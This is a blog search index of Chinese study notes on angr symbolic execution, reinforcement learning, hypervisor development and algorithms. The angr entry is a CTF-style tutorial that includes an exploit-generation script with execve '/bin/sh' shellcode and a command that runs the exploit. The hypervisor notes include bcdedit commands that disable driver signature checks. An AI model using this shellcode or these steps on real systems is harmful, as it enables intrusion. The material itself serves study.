<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[符号执行相关-Angr]]></title>
    <url>%2F2020%2F06%2F25%2F%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%9B%B8%E5%85%B3-Angr%2F</url>
    <content type="text"><![CDATA[总结一下angr在符号执行、fuzz和AEG（Automatic Exploit Generation，漏洞利用自动化）中的相关应用。 Angr相关应用基础应用参见符号执行：利用Angr进行简单CTF逆向分析，利用程序输出特定字符串作为约束来求解对应程序输入。 AEGinsomnihack_aeg，参考基于 angr 的漏洞利用自动生成之缓冲区溢出案例分析。 demo_bin.c：结构体中数组溢出覆盖函数指针 solve.py：求解直接生成exploit（改动部分代码），覆盖PC为保存shellcode的地址 初始化state和SIM。 1234567p = angr.Project(binary)extras = &#123; so.REVERSE_MEMORY_NAME_MAP, # 保留符号变量到内存地址的映射 so.TRACK_ACTION_HISTORY # 保留路径上的state历史&#125;es = p.factory.entry_state(add_options=extras) # 从入口点开始的statesm = p.factory.simulation_manager(es, save_unconstrained=True) # 保存unconstrained state，即指令指针被用户数据或符号化数据控制 寻找PC寄存器全部符号化（可被输入控制）的状态。 1234567891011exploitable_state = Nonewhile exploitable_state is None: sm.step() # 执行一个基本块 if len(sm.unconstrained) &gt; 0: for u in sm.unconstrained: if all([u.solver.symbolic(u.regs.pc[i]) for i in range(u.arch.bits)]): # 该state中PC的每个bit均被符号化 exploitable_state = u break sm.drop(stash='unconstrained')ep = exploitable_state 寻找一块可以存放shellcode的完全符号化内存空间，并建立全部约束。 123456789101112131415161718192021222324252627282930313233def find_symbolic_buffer(state, length): sym_addrs = [ ] for _, symbol in state.solver.get_variables('file', state.posix.stdin.ident): # 从state.posix.stdin.ident（'stdin'）寻找以file开头的符号化变量名? sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables)))) # 符号化变量对应的内存地址 for addr in sym_addrs: if all([ (addr + i) in sym_addrs for i in range(length)]): # 确保连续空间 yield addrshellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")# from capstone import *# for i in Cs(CS_ARCH_X86, CS_MODE_64).disasm(shellcode, 0):# print('0x&#123;&#125;:\t&#123;&#125;\t&#123;&#125;'.format(i.address, i.mnemonic, i.op_str))# 0x0: push 0x68 ; h# 0x2: push 0x732f2f2f ; s///# 0x7: push 0x6e69622f ; nib/# 0x12: mov ebx, esp ; ebx=/bin///sh# 0x14: xor ecx, ecx ; ecx=0# 0x16: push 0xb# 0x18: pop rax ; eax=sys_execve(11)# 0x19: cdq ; edx=0# 0x20: int 0x80for buf_addr in find_symbolic_buffer(ep, len(shellcode)): memory = ep.memory.load(buf_addr, len(shellcode)) # 从state.mem的buf_addr处取出len(shellcode)长度的内存 sc_bvv = ep.solver.BVV(shellcode) # 转为bitvector # 添加约束并检查是否可解 if ep.satisfiable(extra_constraints=(memory == sc_bvv, ep.regs.pc == buf_addr)): ep.add_constraints(memory == sc_bvv) # 正式添加约束 ep.add_constraints(ep.regs.pc == buf_addr) break 求解约束并将结果写入文件。 12with open(filename, 'wb') as f: f.write(ep.posix.dumps(0)) # 求解约束并从0（标准输入）处取出求解结果 测试exploit，可以执行shell命令，其中cat -表示从标准输入读取。 1(cat demo_bin-exploit; cat -) | ./demo_bin 参考资料 angr 系列教程(一）核心概念及模块解读 基于Angr的工具DrillerDriller是将符号执行和fuzz结合的第一个影响较大的工作，它依赖afl-qemu和angr对二进制文件进行分析，在afl遇到诸如if等检查时使用angr从当前样本出发进行符号执行，根据missed state求解产生新状态的输入，然后采用类似slave模式的方法将新样本合并到master中。其核心流程位于driller_main.py，逻辑非常接简洁，个人对其关键步骤做出了注释。 类似工作：$Driller(2016) \rightarrow QSYM(2018) \rightarrow SAVIOR(2020)$，其中QSYM基于kAFL开发，同样依赖于intel-pt，SAVIOR目前未开源。 Driller的安装与使用 RexZeratool]]></content>
      <categories>
        <category>符号执行</category>
      </categories>
      <tags>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gym.spaces总结]]></title>
    <url>%2F2020%2F06%2F03%2FGym-spaces%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[源码 Box Dict Discrete MultiBinary MultiDiscrete Tuple 连续空间 Space字典 离散空间${ 0, 1, \dots, n-1 }$ 多维01空间 多维离散空间（游戏控制器） Space元组 示例 Box(low=-1.0, high=2.0, shape=(3, 4), dtype=np.float32) Discrete(2) MultiBinary(5) MultiDiscrete([ 5, 2, 2 ]) Tuple((spaces.Discrete(2), spaces.Discrete(3))) sample [0,1,0,1,0] (0, 2) 123456789101112131415161718192021# spaces.Dictself.nested_observation_space = spaces.Dict(&#123; 'sensors': spaces.Dict(&#123; 'position': spaces.Box(low=-100, high=100, shape=(3,)), 'velocity': spaces.Box(low=-1, high=1, shape=(3,)), 'front_cam': spaces.Tuple(( spaces.Box(low=0, high=1, shape=(10, 10, 3)), spaces.Box(low=0, high=1, shape=(10, 10, 3)) )), 'rear_cam': spaces.Box(low=0, high=1, shape=(10, 10, 3)), &#125;), 'ext_controller': spaces.MultiDiscrete((5, 2, 2)), 'inner_state':spaces.Dict(&#123; 'charge': spaces.Discrete(100), 'system_checks': spaces.MultiBinary(10), 'job_status': spaces.Dict(&#123; 'task': spaces.Discrete(5), 'progress': spaces.Box(low=0, high=100, shape=()), &#125;) &#125;)&#125;) Action State MountainCarContinuous-v0 Box(1,) Box(2,) LunarLanderContinuous-v2 Box(2,) Box(8,)]]></content>
      <tags>
        <tag>gym</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强化学习纲要笔记]]></title>
    <url>%2F2020%2F05%2F12%2F%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%BA%B2%E8%A6%81%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[周博磊老师的强化学习纲要课程 10课时 课程地址 课程资料 May ReinForce Be With You ! 概括与RL基础 RL特点 试错探索 输入数据有时间关联（非i.i.d） 奖励存在延迟 agent行为影响后续数据 POMDP Cross Entropy method (CEM) 马尔可夫决策过程MP/MRP（小船随波逐流） 计算$V(s)$ 小规模 矩阵求逆 大规模 DP Bootstrap自举迭代Bellman MC 采样取平均 TD = DP + MCMDP（小船上有船夫） Policy Evaluation/(Value) Prediction: 计算$v^{\pi}(s)$ BEE Control: 计算$v^(s)$和$\pi^$ 策略迭代 Policy evaluation: BEE Policy improvement: greedy 值迭代 BOE 无模型的价值函数估计和控制 MDP未知（R和P未知） 交互 Model-free prediction MC empirical mean return 完整episode 增量更新 TD online 每步更新 不完整episode TD target TD error $\infty$-step TD = MC DP MC TD Bootstrap $\checkmark$ $\checkmark$ Sample $\checkmark$ $\checkmark$ Model-free control Generalized Policy Iteration (GPI) $Q=q_\pi$ $\pi=greedy(Q)$ MC/TD $\epsilon$-greedy Sarsa Q(S,A) On-Policy TD Control 同一个Policy进行采集和优化 Q-learning Off-Policy TD Control target $\pi$ greedy behaviour $\mu$ $\epsilon$-greedy 价值函数的近似 VFA 函数近似（大规模问题） 线性叠加特征 梯度下降 非线性 DNN prediction Oracle -&gt; $G_t$ / $TD_{target}$ MC unbiased but noisy TD biased semi-gradient control semi-gradient Sarsa for VFA Control RL死亡三角 FA + bootstrap + off-policy Batch DQN Experience Replay Fixed Target $w^-$ 增加稳定性 target延时更新 猫（estimate）抓老鼠（target） Agent57 策略优化基础（难） Policy-based RL $\tau$为采样 $\pi_\theta(s,a)$ no value function 优势 收敛性更好 高维动作空间上更有效 可以学习随机策略（输出为概率） Rock-Paper-Scissors Aliased Gridworld 劣势 局部最优解 高方差、测试结果不稳定 sample效率低（on-policy） 极大化$J(\theta)$ 可微分 梯度上升 共轭梯度 quasi-newton 不可微分 black-box Derivative-free CEM Hill climbing Evolution alg Policy Example Softmax Gaussian MC Policy Gradient Score Function 公式推导 减小PG方差 Use temporal causality 时序因果关系 REINFORCE (1992) Use a baseline $G_t-b_w(s_t)$ Vanilla PG (1999) Use a Critic $G_t\rightarrow Q_w(s,a)$ AC PG Advantage function (baseline $V$) $A^\pi(s,a) = Q^\pi(s,a) - V^\pi(s)$ MC采样解决不可微分的问题 SOTA RL PG -&gt; TRPO(2015) -&gt; ACKTR(2017) -&gt; PPO(2017) Q-learning -&gt; DDPG(2014) -&gt; TD3(2018) -&gt; SAC(2018) 策略优化进阶 PG 改进思路 训练更稳定 Trust Region KL限制$\pi_\theta$和$\pi_{\theta_{old}}$差异 限定区域（球体）并逐渐缩小 Natural PG 参数空间$\rightarrow$分布空间（policy输出） KL散度（策略更新前后差异较小） Fisher information matrix (FIM) 二阶优化（比SGD更准确） 策略优化和策略函数的参数化形式独立 提高sample效率 on-policy$\rightarrow$off-policy TRPO中的重要性采样IS $\pi_\theta/\pi_{\theta_{old}}$ TRPO (Trust Region Policy Optimization) MM alg (EM) 存在问题 计算量大 需要样本多 Conjugate Gradient (CG)本身较为复杂 部分表现差于DQN ACKTR 提高TRPO的计算效率 K-FAC加速FIM求逆 PPO TRPO的简化（将约束作为惩罚）应用广泛 一阶优化（SGD） with clipping（简单易实现） Q-learning DDPG 将DQN扩展到连续动作空间 Twin Delayed DDPG (TD3) DDPG有时会过大估计Q值 改进 Clipped Double-Q Learning 2个Q函数取较小值 Delayed Policy Update Target Policy Smoothing noise + clip 官方代码非常值得学习 Soft Actor-Critic (SAC) Entropy-regularized RL Reparameterization Trick 基于环境模型的RL方法 简介 学习环境模型 Plan sample效率高（现实应用中非常重要） 难以收敛、2个误差 Model-based value optimization model -&gt; simulated trajectoried -&gt; values -&gt; policy Model Table Lookup 计数 Dyna(1991) 用少量真实轨迹估计模型 Model-based policy optimization model -&gt; policy Optimal Control LQR/iLQR MPC 案例 Robotic Object Manipulation PILCO(2011) (2015) 模仿学习IL 简介 policy network的监督学习 Behavioral cloning (BC) off-course situation中表现差 DAgger: Dataset Aggregation 使数据分布尽可能一致 人工标记 -&gt; 其它算法来标记 Inverse RL (IRL) $R_\theta(s,a)$ Guided Cost Learning (2016) GAIL: Generative Adversarial IL (2016) 类比GAN的思想生成轨迹 进一步改进 Multimodal/Non-Markovian behavior 多峰高斯输出 结合IL和RL Pretrain &amp; Finetune Off-policy IL as an auxiliary loss function 案例 BC 自动驾驶、无人机 IL LSTM (2018) Motion Imitation (2018) PPO 去掉MoCap数据 RL分布式系统 分布式ML 分布式操作系统 MIT EECS 6.824 Consistency, Fault tolerance, Communication Model/Data parallelism Sync/Async Update Hogwild(2011) Lock-free async SGD Jeff Dean MapReduce(2004) DisBelief(2012) AlexNet(2012) 分布式RL DQN(2013) GORILA(2015) A3C(2016) async CPU多线程actor A2C(2017) sync GPU Ape-X(2018) Distributed DQN/DDPG IMPALA(2018) actor只产生experience而不是gradient IS RLLib(2018) 将不同算法模块化 reuse Evolution Strategies(2017) 案例 AlphaGo OpenAI Five AlphaStar PPO Rapid训练框架 完结篇RL in a nutshell Basics of RL MDP and tabular solution methods 价值函数近似 策略优化 Log Derivative Trick vs. Reparameterization Trick Spinning-Up 各种RL算法的原理和实现 其它主题 Model-based RL 效率高、存在2处近似误差 模仿学习 policy的监督学习 分布式系统 Open problems Sample efficiency Generalist RL rather than specialist RL New env and agent designs ml-agents Bridge RL with other ML topics Yann LeCun’s cake]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
      <tags>
        <tag>强化学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hypervisor From Scratch]]></title>
    <url>%2F2020%2F04%2F16%2FHypervisor-From-Scratch%2F</url>
    <content type="text"><![CDATA[Hypervisor From Scratch 系列文章学习笔记 实验代码 Part 1: 基本概念和环境搭建 Intel VT-x Virtual Machine eXtension (VMX) AMD AMD-V Secure Virtual Machine (SVM) x64 Inline Assembly in Windows Driver Kit Writing a Windows Kernel Driver 12[HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Session Manager/Debug Print Filter] DEFAULT=dword:0000000f 关键概念 Virtual Machine Monitor (VMM) VMM acts as a host and has full control of the processor(s) and other platform hardware. A VMM is able to retain selective control of processor resources, physical memory, interrupt management, and I/O. Guest Software Each virtual machine (VM) is a guest software environment. VMX Root Operation and VMX Non-root Operation A VMM will run in VMX root operation and guest software will run in VMX non-root operation VMX transitions Transitions between VMX root operation and VMX non-root operation. VM entries Transitions into VMX non-root operation. Extended Page Table (EPT) A modern mechanism which uses a second layer for converting the guest physical address to host physical address. VM exits Transitions from VMX non-root operation to VMX root operation. Virtual machine control structure (VMCS) a data structure in memory that exists exactly once per VM (or more precisely one per each VCPU [Virtual CPU]), while it is managed by the VMM. With every change of the execution context between different VMs, the VMCS is restored for the current VM, defining the state of the VM’s virtual processor and VMM control Guest software using VMCS. VMCS由6部分组成: VMCS结构图 Guest-state area Processor state saved into the guest state area on VM exits and loaded on VM entries. Host-state area Processor state loaded from the host state area on VM exits. VM-execution control fields Fields controlling processor operation in VMX non-root operation. VM-exit control fields Fields that control VM exits. VM-entry control fields Fields that control VM entries. VM-exit information fields Read-only fields to receive information on VM exits describing the cause and the nature of the VM exit. VMX指令 INVEPT Invalidate Translations Derived from EPT INVVPID Invalidate Translations Based on VPID VMCALL Call to VM Monitor VMCLEAR Clear Virtual-Machine Control Structure VMFUNC Invoke VM function VMLAUNCH Launch Virtual Machine VMRESUME Resume Virtual Machine VMPTRLD Load Pointer to Virtual-Machine Control Structure VMPTRST Store Pointer to Virtual-Machine Control Structure VMREAD Read Field from Virtual-Machine Control Structure VMWRITE Write Field to Virtual-Machine Control Structure VMXOFF Leave VMX Operation VMXON Enter VMX Operation Part 2: 开启VMX 关闭驱动签名验证 bcdedit.exe /set nointegritychecks on 打开测试模式 bcdedit /set testsigning on 一边按住Shift一边重启，选择7关闭签名验证（仅本次有效） IRP Major Functions IRP_MJ_CREATE IRP_MJ_DEVICE_CONTROL IRP Minor Functions (mainly used for PnP manager to notify for a special event) Fast I/O 先、快于IRP 检查Hypervisor支持 EAX = 0 CPUID检查字符串GenuineIntel，判断是否为Intel处理器 CPUID.1:ECX.VMX[bit 5] = 1，判断是否支持VMX 开启VMX CR4.VMXE[bit 13] = 1 MyHypervisorDriver调用IoCreateDevice函数创建设备并为其IRP_MJ_CREATE指定DrvCreate函数，DrvCreate函数开启VMX，并调用DbgPrint函数输出，用Dbgview中查看。 MyHypervisorApp利用__asm检查CPU是否支持VMX，如果支持则调用CreateFile函数打开设备，触发驱动的DrvCreate函数，开启VMX。 Part 3: 建立第一个虚拟机 IOCTL(32bit) METHOD_BUFFERED METHOD_NIETHER METHOD_IN_DIRECT METHOD_OUT_DIRECT 内核函数/宏 KeQueryActiveProcessorCount 获取逻辑处理器数 KeSetSystemAffinityThread 将当前线程分配到某个逻辑处理器上 KeRevertToUserAffinityThread 恢复线程运行的处理器 MmGetPhysicalAddress 虚拟地址-&gt;物理地址 MmGetVirtualForPhysical 物理地址-&gt;虚拟地址 MmAllocateContiguousMemory 申请对齐的连续内存 MmFreeContiguousMemory 释放上述内存 RtlSecureZeroMemory 初始化内存为0 __readmsr 读取IA32_FEATURE_CONTROL_MSR，用于检查VMX支持、保存RevisionId __vmx_on __vmx_vmptrld __vmx_off PAGED_CODE 确保调用线程运行在一个允许分页的足够低IRQL级别 MyHypervisorDriver调用IoCreateDevice函数创建设备并为其IRP_MJ_CREATE指定DrvCreate函数，为IRP_MJ_CLOSE指定DrvClose函数。DrvCreate函数初始化VMX，为每个逻辑处理器开启VMX并为VMXON和VMCS分配内存，DrvClose则相反。 MyHypervisorApp调用CreateFile函数打开设备，触发驱动的DrvCreate函数，开启VMX，并为每个逻辑处理器的VMXON和VMCS分配内存；调用CloseHandle关闭设备，触发驱动的DrvClose函数，关闭VMX并释放内存。 用户态和VMM驱动交互 MyHypervisorDriver为IRP_MJ_DEVICE_CONTROL指定DrvIOCTLDispatcher函数，与MyHypervisorApp通过IOCTL通信（内存读取）。MyHypervisorApp调用DeviceIoControl函数并指定IoControlCode触发DrvIOCTLDispatcher。 Part 4: 使用EPT进行地址转换 Turning the Pages: Introduction to Memory Paging on Windows 10 x64 Windbg !pte PXE = PML4E PPE = PDPE !vtop 将虚拟地址转换为物理地址 Introduction to IA-32e hardware paging Intel 64位分页机制 PG flag: CR0[bit 31]: 开启分页 Physical Address Extension (PAE): CR4[bit 5]: 未设置则使用32bit分页 Long Mode Enable (LME): Extended Feature Enable Register (IA32_EFER MSR)[bit 8]: 未设置则使用PAE 36bit分页，否则使用64bit的4层分页机制 Page Frame Number (PFN): the next paging structure in the hierarchy (0x1000 4 KB) 4096bytes 512 entries(PFN) CR3保存第一个页结构的物理地址 虚拟地址 [bits 63-48] 保留 [bits 47-39] a PML4 table (located in CR3) offset [bits 38-30] a Page Directory Pointer Table (PDPT) offset [bits 29-21] a Page Directory (PD) offset [bits 20-12] a Page Table (PT) offset [bits 11-00] 物理页中的偏移 使用Windbg具体分析 Second Level Address Translation (SLAT) or nested paging an extended layer in the paging mechanism hardware-based virtualization virtual addresses -&gt; physical memory 实现 AMD: Rapid Virtualization Indexing (RVI)/Nested Page Tables (NPT) Intel: Extended Page Table (EPT) ARM: Stage-2 page-tables 两种方法 Shadow Page Tables (Software-assisted paging) Extended Page Tables (Hardware-assisted paging) Page table maintained by guest OS generate the guest-physical address. Page table maintained by VMM map guest physical address to host physical address. MyHypervisorDriver添加了EPT的初始化代码，为64bit的4层地址转换的每个结构表申请内存空间。 Part 5: 建立VMCS并在虚拟机中执行代码 内核函数 __vmx_vmptrst __vmx_vmclear __vmx_vmptrld __vmx_vmlaunch __vmx_vmread __vmx_vmwrite 将数据写入VMCS的指定字段 __vmx_vmresume VMX Controls VM-Execution Controls Primary Processor-Based VM-Execution ControlsSecondary Processor-Based VM-Execution Controls 设置VMCS VM-entry Control Bits VM-exit Control Bits PIN-Based Execution Control governs the handling of asynchronous events Activity State 0:Active 1:HLT 2:Shutdown 3:Wait-for-SIPI Interruptibility State permit certain events to be blocked for a period of time MyHypervisorDriver通过__vmx_vmwrite设置VMCS的各项内容（非常复杂），并调用LaunchVM在第0号虚拟处理器上设置VMCS（设置CPU_BASED_HLT_EXITING即在HLT时调用VM-Exit，设置HOST_RIP指向VMExitHandler在处理EXIT_REASON_HLT中调用VMXOFF），最后调用__vmx_vmlaunch执行HLT(\xF4)，触发VM-Exit。 Part 6: 虚拟化正在运行的系统 CPU_BASED_VM_EXEC_CONTROL CPU_BASED_ACTIVATE_MSR_BITMAP SECONDARY_VM_EXEC_CONTROL CPU_BASED_CTL2_RDTSCPCPU_BASED_CTL2_ENABLE_INVPCIDCPU_BASED_CTL2_ENABLE_XSAVE_XRSTORS IRQL(Interrupt Request Level): a Windows-specific mechanism to manage interrupts or giving priority by their level so raising IRQL means your routine will execute with higher priority than normal Windows codes (PASSIVE LEVEL &amp; APC LEVEL).12KIRQL OldIrql = KeRaiseIrqlToDpcLevel(); // raises the IRQL to Dispatch Level so the Windows Scheduler can’t kick in to change the contextKeLowerIrql(OldIrql); CPUID is one the main instructions that cause the VM-Exit. 内核函数 _cpuidex CPUID HYPERV_HYPERVISOR_PRESENT_BIT Defeating malware’s Anti-VM techniques (CPUID-Based Instructions)]]></content>
      <categories>
        <category>Hypervisor</category>
      </categories>
      <tags>
        <tag>Hypervisor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见算法搜集]]></title>
    <url>%2F2020%2F03%2F31%2F%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E6%90%9C%E9%9B%86%2F</url>
    <content type="text"><![CDATA[Leetcode中常用算法的总结 排序算法 相关题目：912 快速排序123456789101112131415161718192021222324252627class Solution: def partition(self, nums, left, right): pivot = nums[left] # 在left(l)挖坑 l, r = left, right while l &lt; r: while l &lt; r and nums[r] &gt;= pivot: r -= 1 if l &lt; r: nums[l] = nums[r] # 在r挖坑，填l的坑 l += 1 while l &lt; r and nums[l] &lt;= pivot: l += 1 if l &lt; r: nums[r] = nums[l] # 在l挖坑，填r的坑 r -= 1 nums[l] = pivot return l def quicksort(self, nums, left, right): if left &lt; right: pivot_loc = self.partition(nums, left, right) self.quicksort(nums, left, pivot_loc - 1) self.quicksort(nums, pivot_loc + 1, right) def sortArray(self, nums: List[int]) -&gt; List[int]: self.quicksort(nums, 0, len(nums) - 1) return nums 堆排序12345678910111213141516171819202122232425262728class Solution: def max_heapify(self, heap, root, heap_len): # 从root开始，依次与左右节点中较大的值进行交换 p = root while p * 2 + 1 &lt; heap_len: l, r = p * 2 + 1, p * 2 + 2 if heap_len &lt;= r or heap[r] &lt; heap[l]: nex = l else: nex = r if heap[p] &lt; heap[nex]: heap[p], heap[nex] = heap[nex], heap[p] p = nex else: break def build_heap(self, heap): for i in range(len(heap) - 1, -1, -1): self.max_heapify(heap, i, len(heap)) def heap_sort(self, nums): self.build_heap(nums) # 构建初始堆，从最后一个叶结点开始向上遍历，每一个节点都保证以自己为根节点的树中自己的值最大 for i in range(len(nums) - 1, -1, -1): nums[i], nums[0] = nums[0], nums[i] # 将当前最大值交换到队尾，找到一个元素的正确位置 self.max_heapify(nums, 0, i) def sortArray(self, nums): self.heap_sort(nums) return nums]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百面机器学习笔记]]></title>
    <url>%2F2020%2F02%2F27%2F%E7%99%BE%E9%9D%A2%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[包括机器学习和算法2部分 课程地址 Week 1机器学习分类算法 逻辑回归 极大似然估计 似然：通过样本猜测总体 梯度下降法推导 逻辑回归推导 在线性回归外层套一个sigmoid 决策树 ID3 信息增益 仅离散属性 C4.5 信息增益比 = 信息增益/划分前熵 连续值 CART Gini指数（集合的不确定性） 仅二叉树 剪枝（防止过拟合） 预剪枝 后剪枝（剪掉叶结点较少的分支） 算法 快速排序 挖坑法（双指针） 指针交换法（交换数据） 堆排序 双指针 对撞指针 快慢指针 滑动窗口 题目算法刷题重点题型 [x] 双指针（167）：https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted [ ] 快速选择、堆排序、归并排序（215）：https://leetcode-cn.com/problems/kth-largest-element-in-an-array [ ] 桶排序（347）：https://leetcode-cn.com/problems/top-k-frequent-elements [x] 滑动窗口（209）：https://leetcode-cn.com/problems/minimum-size-subarray-sum/ 长度最小的连续子数组 [x] 滑动窗口（438）：https://leetcode-cn.com/problems/find-all-anagrams-in-a-string/ 找到字符串中所有字母异位词 [ ] 滑动窗口（76）：https://leetcode-cn.com/problems/minimum-window-substring/ 最小覆盖子串 算法刷题课后作业 [ ] 数组中重复的数字：https://www.nowcoder.com/practice/623a5ac0ea5b4e5f95552655361ae0a8 [ ] 构建乘积数组：https://www.nowcoder.com/practice/94a4d381a68b47b7a8bed86f2975db46 [ ] 二维数组中的查找：https://www.nowcoder.com/practice/abc3fe2ce8e146608e868a70efebf62e Week 2机器学习 SVM 线性可分 超平面 最大间隔超平面（最近的样本点到平面的距离） 支持向量（距离超平面最近的点） SVM的最优化问题 对偶问题 构造拉格朗日函数 $min(max(f)) = max(min(f))$（强对偶关系） KKT约束条件（强对偶性的充要条件） SMO（序列最小优化）算法求$\lambda^*$ 软间隔（允许个别样本点出现在间隔带里） 松弛变量$\xi$ 核函数（线性不可分） 非线性SVM（映射到更高维度） $k(x_i,x_j)=\phi(x_i)\phi(x_j)$减少映射的计算量 常用核函数 线性核函数 多项式核（不平稳，数据已归一化） RBF核（高斯核）$\gamma$（最常用） 降维 PCA和LDA PCA 最大化投影的方差 LDA（Linear Discriminant Analysis）有监督 最大化类间距离以及最小化类内距离 算法 KMP算法 字符串匹配 空间换时间 部分匹配表PMT：记录字符串前缀集合和后缀集合交集中最长元素长度（子字符串p） 向右移动一位得到next数组，0位填-1 根据p求解next 二分搜索 while left &lt;= right if right = str.len - 1 mid = lower + (upper - lower) // 2 防止溢出 目标有多个重复 最左侧 left = 0 right = str.len # [) while left &lt; right # [left, left) mid = (left + right) // 2 if str[mid] == target: right = mid if str[mid] &lt; target: left = mid + 1 if str[mid] &gt; target: right = mid return left 最右侧 left = 0 right = str.len # [) while left &lt; right # [right, right) mid = (left + right) // 2 if str[mid] == target: left = mid + 1 if str[mid] &lt; target: left = mid + 1 if str[mid] &gt; target: right = mid return left - 1 哈希表 题目算法刷题重点题型 [ ] 替换空格：https://www.nowcoder.com/practice/4060ac7e3e404ad1a894ef3e17650423 [ ] 正则表达式匹配：https://www.nowcoder.com/practice/45327ae22b7b413ea21df13ee7d6429c [ ] 表示数值的字符串：https://www.nowcoder.com/practice/6f8c901d091949a5837e24bb82a731f2 [ ] 字符流中第一个不重复的字符：https://www.nowcoder.com/practice/00de97733b8e4f97a3fb5c680ee10720 [ ] 二分搜索（69）：https://leetcode-cn.com/problems/sqrtx/ [ ] 哈希表（1）：https://leetcode-cn.com/problems/two-sum/ [ ] 旋转数组的最小数字：https://www.nowcoder.com/practice/9f3231a991af4f55b95579b44b7a01ba 算法刷题课后作业 [ ] 左旋转字符串：https://www.nowcoder.com/practice/12d959b108cb42b1ab72cef4d36af5ec [ ] 字符串的排列：https://www.nowcoder.com/practice/fe6b651b66ae47d7acce78ﬀdd9a96c7 [ ] 第一个只出现一次的字符：https://www.nowcoder.com/practice/1c82e8cf713b4bbeb2a5b31cf5b0417c [ ] 在排序数组中查找元素的第一个和最后一个位置（34）：https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/ [ ] 找到 K 个最接近的元素（658）：https://leetcode-cn.com/problems/find-k-closest-elements/ [ ] 长度最小的子数组（209）：https://leetcode-cn.com/problems/minimum-size-subarray-sum/ [ ] 有序矩阵中第 K 小的元素（378）：https://leetcode-cn.com/problems/kth-smallest-element-in-a-sorted-matrix/ Week 3机器学习 K-means EM（Expectation Maximum）算法 收敛性证明 算法 虚拟头结点 删除链表中重复的结点 3指针：基准、快、慢 链表中环的入口结点 哈希表 快慢指针 栈和队列 由链表实现 [].pop(0) [].pop() 题目算法刷题重点题型 [ ] 删除链表中重复的结点：https://www.nowcoder.com/practice/fc533c45b73a41b0b44ccba763f866ef [ ] 链表中环的入口结点：https://www.nowcoder.com/practice/253d2c59ec3e4bc68da16833f79a38e4 [ ] 用两个栈实现队列：https://www.nowcoder.com/practice/54275ddae22f475981afa2244dd448c6 [ ] 滑动窗口的最大值：https://www.nowcoder.com/practice/1624bc35a45c42c0bc17d17fa0cba788 算法刷题课后作业 [ ] 从尾到头打印链表：https://www.nowcoder.com/practice/d0267f7f55b3412ba93bd35cfa8e8035 [ ] 相交链表（160）：https://leetcode-cn.com/problems/intersection-of-two-linked-lists/ [ ] 用栈实现队列（232）：https://leetcode-cn.com/problems/implement-queue-using-stacks/ Week 4机器学习 HMM 概率模型 生成模型 联合概率分布 判别模型 条件概率分布 基本假设 齐次马尔可夫假设 观测独立性检测 基本问题 概率计算：计算观测值的概率 直接计算 前向、后向算法（DP） 预测/解码：通过观测序列求状态序列 维特比算法（DP）Viterbi 学习/训练：计算$\lambda$ 有监督 无监督：仅观测序列 Baum-Welch算法 实例 from hmmlearn import hmm CRF 条件随机场 基础概念 概率有向图模型 HMM 贝叶斯网络 概率无向图模型 马尔可夫网络 马尔可夫随机场（MRF）（生成式模型） 团Clique：图中节点的子集，其中任意2个节点有边直接连接 势函数：非负实函数 Hammersley-Clifford定理 MRF表达为正概率分布 分离 分离集 特征函数 CRF 判别式模型 有条件的MRF 线性链CRF 指数势函数 三个问题 概率计算 预测 学习 算法 DFS和BFS BFS (279) 队列 邻接表 $O(V)+O(E)$ 临界矩阵 $O(V^2)$ DFS (695) 递归 栈-非递归 树的前序遍历 最短路径 Dijkstra (743) 1点到其它，每次确定一个结点 记录上一个结点可得到路径 权值非负 $O(V^2+E)$ 稀疏图 Bellman-Ford 权值可以为负（负环） 循环遍历所有边，直到所有值不改变（最多N-1） $O(VE)$ 最小生成树 图的最小连通子图 并查集 用集合中的一个元素代表集合（帮会）(684) Kruskal (1135) 对边排序，从小到大并查集 Prim 从某顶点开始，每次吸纳1个结点 二叉树的遍历（stack非递归较复杂） 前序 中序 后序 层次（queue） 二叉搜索树和平衡二叉树 |左右子树高度之差|&lt;=1 搜索 插入 平衡（只调整失衡的第一个结点） 左-左 右旋 右-右 左-右 左旋（产生左-左）-&gt;右旋 右-左 删除 结点不存在 叶子节点 有1个孩子 有2个孩子 平衡 题目算法刷题重点题型树类问题： [ ] 平衡二叉树（110）：https://leetcode-cn.com/problems/balanced-binary-tree [ ] 找树左下角的值（513）：https://leetcode-cn.com/problems/find-bottom-left-tree-value [ ] 二叉树展开为链表（114）：https://leetcode-cn.com/problems/flatten-binary-tree-to-linked-list [x] 二叉搜索树中第K小的元素（230）：https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst [ ] 实现 Trie (前缀树)（208）：https://leetcode-cn.com/problems/implement-trie-prefix-tree [ ] 序列化二叉树：https://www.nowcoder.com/practice/cf7e25aa97c04cc1a68c8f040e71fb84 [ ] 重建二叉树：https://www.nowcoder.com/practice/8a19cbe657394eeaac2f6ea9b0f6fcf6 图类问题： [ ] 判断二分图（785）：https://leetcode-cn.com/problems/is-graph-bipartite [ ] 拓扑排序（207）：https://leetcode-cn.com/problems/course-schedule [ ] 并查集（684）：https://leetcode-cn.com/problems/redundant-connection [ ] 岛屿的最大面积（695）：https://leetcode-cn.com/problems/max-area-of-island/ DFS或BFS 算法刷题课后作业 [ ] 对称的二叉树：https://www.nowcoder.com/practice/ﬀ05d44dfdb04e1d83bdbdab320efbcb [ ] 把二叉树打印成多行：https://www.nowcoder.com/practice/445c44d982d04483b04a54f298796288 [ ] 